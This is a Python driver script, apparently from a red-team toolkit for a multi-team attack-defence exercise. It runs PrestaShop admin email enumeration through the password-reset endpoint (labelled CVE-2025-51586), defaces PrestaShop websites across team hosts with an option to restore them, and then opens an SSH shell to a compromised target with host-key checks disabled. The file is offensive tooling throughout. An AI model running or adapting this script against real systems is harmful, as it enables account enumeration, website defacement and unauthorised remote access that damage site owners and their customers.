#!/usr/bin/env python3
import argparse
import shutil
import subprocess
import sys
from pathlib import Path

SCRIPT_DIR = Path(__file__).resolve().parent
ROOT_DIR = SCRIPT_DIR.parent
if str(ROOT_DIR) not in sys.path:
    sys.path.insert(0, str(ROOT_DIR))

from lib.common import resolve_team_numbers
from init_access.cve_2025_51586_enum import run_enumeration
from lib.operations import DEFAULT_USER, RemoteExecutor, TARGETS, WebsiteDefacement


def parse_targets(choice: str) -> list:
    if choice == "all":
        return [t.hostname for t in TARGETS]
    if choice == "linux":
        return [t.hostname for t in TARGETS if t.os_type == "linux"]
    if choice == "windows":
        return [t.hostname for t in TARGETS if t.os_type == "windows"]
    return [t.strip() for t in choice.split(",") if t.strip()]


def main() -> int:
    parser = argparse.ArgumentParser(description="Website defacement actions across all teams.")
    parser.add_argument("--teams-count", type=int, help="Number of teams playing")
    parser.add_argument("--teams", help="Team range (e.g., '1-12' or '1,3,5').")
    parser.add_argument("--targets", default="storage", help="all, linux, windows, or comma-separated hostnames")
    parser.add_argument("--action", required=True, choices=["deface_prestashop", "restore_prestashop"])
    parser.add_argument("--root", default="/var/www/prestashop", help="PrestaShop root path")
    parser.add_argument(
        "--skip-prestashop-enum",
        action="store_true",
        help="Skip CVE-2025-51586 email enumeration before defacement",
    )
    parser.add_argument(
        "--shell-on-success",
        choices=["auto", "always", "never"],
        default="auto",
        help="Open an SSH shell after defacement (auto opens only for single target/team)",
    )
    parser.add_argument("--enum-start-id", type=int, default=1, help="Starting id_employee to test")
    parser.add_argument("--enum-end-id", type=int, default=100, help="Ending id_employee to test")
    parser.add_argument("--enum-method", default="POST", help="HTTP method: GET or POST")
    parser.add_argument("--enum-reset-token", default="invalidtoken123", help="Reset token to send")
    parser.add_argument("--enum-delay", type=float, default=0.5, help="Delay between requests (seconds)")
    parser.add_argument("--enum-timeout", type=int, default=10, help="HTTP timeout (seconds)")
    parser.add_argument(
        "--enum-path",
        default="/admin/index.php?controller=AdminLogin&reset=1",
        help="Reset endpoint path",
    )
    parser.add_argument("--enum-scheme", default="http", help="http or https")
    args = parser.parse_args()

    teams = resolve_team_numbers(args.teams, args.teams_count)
    targets = parse_targets(args.targets)

    print(f"[+] Target teams: {teams}")
    print(f"[+] Action: {args.action} | Targets: {targets}")

    executor = RemoteExecutor(teams)
    defacer = WebsiteDefacement(executor)

    if args.action == "deface_prestashop":
        if not args.skip_prestashop_enum:
            findings = run_enumeration(
                teams,
                [t for t in TARGETS if t.hostname in targets],
                args.enum_scheme,
                args.enum_path,
                args.enum_start_id,
                args.enum_end_id,
                args.enum_method,
                args.enum_reset_token,
                args.enum_delay,
                args.enum_timeout,
            )
            if findings:
                print(f"[+] Enumerated {len(findings)} PrestaShop admin email(s) before defacement")
        results = defacer.deface_prestashop(targets, prestashop_root=args.root)
    else:
        results = defacer.restore_prestashop(targets, prestashop_root=args.root)

    print(f"Success: {len(results['success'])}, Failed: {len(results['failed'])}")

    if args.action == "deface_prestashop" and args.shell_on_success != "never":
        ssh_success = [entry for entry in results["success"] if entry.get("method") == "ssh"]
        if ssh_success:
            if args.shell_on_success == "always" or (
                args.shell_on_success == "auto"
                and len(teams) == 1
                and len(targets) == 1
                and len(ssh_success) == 1
            ):
                if shutil.which("ssh") is None:
                    print("[!] SSH client not found; cannot open shell automatically.")
                else:
                    entry = ssh_success[0]
                    ip = entry.get("ip")
                    if ip:
                        print(f"[+] Launching SSH shell to {DEFAULT_USER}@{ip}...")
                        subprocess.run(
                            [
                                "ssh",
                                "-o",
                                "StrictHostKeyChecking=no",
                                "-o",
                                "UserKnownHostsFile=/dev/null",
                                f"{DEFAULT_USER}@{ip}",
                            ],
                            check=False,
                        )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
